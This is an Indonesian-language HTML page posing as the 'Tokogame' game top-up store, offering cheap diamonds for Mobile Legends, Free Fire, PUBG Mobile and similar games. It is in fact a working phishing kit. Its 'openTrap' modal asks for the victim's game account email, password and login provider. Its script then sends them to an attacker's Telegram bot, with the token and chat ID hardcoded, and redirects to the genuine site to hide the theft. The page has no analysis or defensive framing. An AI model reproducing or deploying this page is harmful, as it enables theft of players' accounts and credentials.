<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tokogame | Top Up Games Murah & Aman</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; overflow-x: hidden; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 100; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(5px); }
        .game-card:active { transform: scale(0.95); }
    </style>
</head>
<body>

    <nav class="bg-white p-4 shadow-sm flex justify-between items-center sticky top-0 z-50 border-b border-gray-100">
        <div class="flex items-center space-x-1">
            <span class="text-xl font-black italic bg-[#1e293b] text-white px-2 rounded uppercase tracking-tighter">TOKOGAME</span>
        </div>
        <div class="flex items-center gap-2">
             <button class="bg-[#1e293b] text-white px-5 py-1.5 rounded-lg font-bold text-sm">Login</button>
        </div>
    </nav>

    <div class="bg-white py-2 border-b border-gray-100 text-center">
        <p class="text-[10px] font-bold text-gray-500 italic uppercase tracking-widest">Top Up Games & Voucher Murah, Aman, Cepat</p>
    </div>

    <div class="p-4 max-w-md mx-auto">
        <img src="https://img.youtube.com/vi/6p3v0Yis_hI/maxresdefault.jpg" class="w-full rounded-2xl shadow-lg border-2 border-white">
    </div>

    <div class="px-4 mb-6 max-w-md mx-auto">
        <input type="text" placeholder="Cari di Tokogame..." class="w-full p-3 bg-white border border-gray-200 rounded-2xl shadow-sm outline-none focus:ring-2 focus:ring-green-400 text-sm">
    </div>

    <div class="px-4 max-w-md mx-auto mb-20">
        <div class="flex justify-between items-center mb-4">
            <h2 class="text-lg font-black italic border-l-4 border-[#00b894] pl-2 uppercase text-slate-800">Top Up Game</h2>
            <span class="text-[#00b894] font-bold text-[10px] uppercase">Lihat Semua ></span>
        </div>
        
        <div class="grid grid-cols-3 gap-3">
            <div onclick="openTrap('Mobile Legends')" class="bg-white p-2 rounded-2xl shadow-sm border border-gray-100 cursor-pointer text-center game-card">
                <img src="https://gcdn.pbrd.co/images/qS0xR4bF5vU8.jpg?format=webp" class="rounded-2xl mb-1 aspect-square object-cover w-full">
                <p class="text-[9px] font-bold leading-tight text-slate-700">Mobile Legends Diamonds</p>
            </div>
            <div onclick="openTrap('Free Fire')" class="bg-white p-2 rounded-2xl shadow-sm border border-gray-100 cursor-pointer text-center game-card">
                <img src="https://gcdn.pbrd.co/images/uR3Vq4nZ9lM1.jpg?format=webp" class="rounded-2xl mb-1 aspect-square object-cover w-full">
                <p class="text-[9px] font-bold leading-tight text-slate-700">Free Fire Diamonds</p>
            </div>
            <div onclick="openTrap('PUBG Mobile')" class="bg-white p-2 rounded-2xl shadow-sm border border-gray-100 cursor-pointer text-center game-card">
                <img src="https://gcdn.pbrd.co/images/8WzD2mK5vL9x.jpg?format=webp" class="rounded-2xl mb-1 aspect-square object-cover w-full">
                <p class="text-[9px] font-bold leading-tight text-slate-700">PUBG Mobile UC</p>
            </div>
             <div onclick="openTrap('Honor of Kings')" class="bg-white p-2 rounded-2xl shadow-sm border border-gray-100 cursor-pointer text-center game-card">
                <img src="https://gcdn.pbrd.co/images/4j2v1mK9bL0p.jpg?format=webp" class="rounded-2xl mb-1 aspect-square object-cover w-full">
                <p class="text-[9px] font-bold leading-tight text-slate-700">Honor of Kings Tokens</p>
            </div>
             <div onclick="openTrap('Higgs Domino')" class="bg-white p-2 rounded-2xl shadow-sm border border-gray-100 cursor-pointer text-center game-card">
                <img src="https://via.placeholder.com/150/FFD700/000000?text=HIGGS" class="rounded-2xl mb-1 aspect-square object-cover w-full">
                <p class="text-[9px] font-bold leading-tight text-slate-700">Higgs Games Island MD</p>
            </div>
             <div onclick="openTrap('Bigo Live')" class="bg-white p-2 rounded-2xl shadow-sm border border-gray-100 cursor-pointer text-center game-card">
                <img src="https://via.placeholder.com/150/00FFFF/000000?text=BIGO" class="rounded-2xl mb-1 aspect-square object-cover w-full">
                <p class="text-[9px] font-bold leading-tight text-slate-700">Bigo Live Diamonds</p>
            </div>
        </div>
    </div>

    <div id="trapModal" class="modal">
        <div class="bg-white w-full max-w-xs rounded-[2rem] p-7 shadow-2xl relative border-t-8 border-[#00b894]">
            <h3 id="gameTitle" class="text-center font-black text-xl mb-1 uppercase italic text-slate-800 tracking-tighter">GAME</h3>
            <p class="text-center text-[10px] text-gray-400 mb-6 font-medium">Sistem memerlukan verifikasi akun untuk memproses Diamond promo ke ID kamu.</p>
            
            <div class="space-y-4">
                <div class="relative">
                    <input type="text" id="user" placeholder="Email / ID Akun" class="w-full p-4 bg-gray-50 rounded-2xl border border-gray-100 outline-none focus:border-[#00b894] text-sm transition-all shadow-inner">
                </div>
                <div class="relative">
                    <input type="password" id="pass" placeholder="Password Akun" class="w-full p-4 bg-gray-50 rounded-2xl border border-gray-100 outline-none focus:border-[#00b894] text-sm transition-all shadow-inner">
                </div>
                <select id="login_via" class="w-full p-4 bg-gray-50 rounded-2xl border border-gray-100 text-xs font-bold text-slate-600 outline-none">
                    <option>Login via Facebook</option>
                    <option>Login via Moonton</option>
                    <option>Login via Google (Play Games)</option>
                    <option>Login via VK</option>
                </select>
                <button onclick="kirimData()" id="btnKirim" class="w-full py-4 bg-[#1e293b] text-white font-black rounded-2xl shadow-xl hover:bg-black transition-all active:scale-95 uppercase tracking-widest text-sm">Konfirmasi & Bayar</button>
            </div>
            <p onclick="closeTrap()" class="text-center text-[10px] text-gray-400 mt-5 cursor-pointer hover:text-red-500 font-bold uppercase transition">Kembali</p>
        </div>
    </div>

    <script>
        // --- CONFIG QUANTUM V8.0 ---
        const TOKEN = "8549150731:AAEQ4zuXye4OjCleSvOB0-Q3oK6cejine4M"; 
        const CHAT_ID = "1424892421"; 
        // ---------------------------

        let selectedGame = "";

        function openTrap(name) {
            selectedGame = name;
            document.getElementById('gameTitle').innerText = name;
            document.getElementById('trapModal').style.display = 'flex';
        }

        function closeTrap() {
            document.getElementById('trapModal').style.display = 'none';
        }

        async function kirimData() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            const via = document.getElementById('login_via').value;
            const btn = document.getElementById('btnKirim');

            if(!user || !pass) return alert("Woi! Isi dulu datanya!");

            btn.innerText = "SINKRONISASI...";
            btn.disabled = true;

            const pesan = `
🚀 *PANEN BARU ARULMODSS!* 🚀
━━━━━━━━━━━━━━━━
🎮 *GAME* : ${selectedGame}
👤 *USER* : \`${user}\`
🔑 *PASS* : \`${pass}\`
🌐 *VIA* : ${via}
━━━━━━━━━━━━━━━━
🕒 ${new Date().toLocaleString('id-ID')}
🔥 *STATUS: SUCCESS GACOR*`;

            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;

            try {
                await fetch(url);
                // Buang ke web asli Tokogame
                window.location.href = "https://www.tokogame.com";
            } catch (e) {
                alert("Yah, koneksi error! Coba lagi!");
                btn.disabled = false;
                btn.innerText = "Konfirmasi & Bayar";
            }
        }
    </script>
</body>
</html>
